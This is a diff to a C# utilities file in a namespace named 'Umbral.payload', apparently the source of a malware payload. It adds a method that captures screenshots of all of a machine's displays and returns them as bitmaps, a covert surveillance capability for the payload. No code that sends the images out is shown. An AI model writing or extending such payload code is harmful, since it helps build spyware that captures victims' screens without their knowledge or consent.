@@ -1,4 +1,7 @@
 ﻿using System;
+using System.Collections.Generic;
+using System.Drawing;
+using System.Drawing.Imaging;
 using System.IO;
 using System.IO.Compression;
 using System.Linq;
@@ -7,6 +10,7 @@ using System.Net.Http;
 using System.Reflection;
 using System.Text;
 using System.Threading.Tasks;
+using System.Windows.Forms;
 
 namespace Umbral.payload.Utilities
 {
@@ -94,6 +98,34 @@ namespace Umbral.payload.Utilities
                 }
 
             return false;
+        }
+
+        internal static Bitmap[] CaptureScreenShot()
+        {
+            List<Bitmap> results = new List<Bitmap>();
+            Screen[] allScreens = Screen.AllScreens;
+
+            foreach (Screen screen in allScreens)
+            {
+                try
+                {
+                    Rectangle bounds = screen.Bounds;
+                    using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
+                    {
+                        using (Graphics graphics = Graphics.FromImage(bitmap))
+                        {
+                            graphics.CopyFromScreen(new Point(bounds.Left, bounds.Top), Point.Empty, bounds.Size);
+                        }
+                        results.Add((Bitmap)bitmap.Clone());
+                    }
+                }
+                catch (Exception e)
+                {
+                    Console.WriteLine(e);
+                }
+            }
+
+            return results.ToArray();
         }
     }
 }
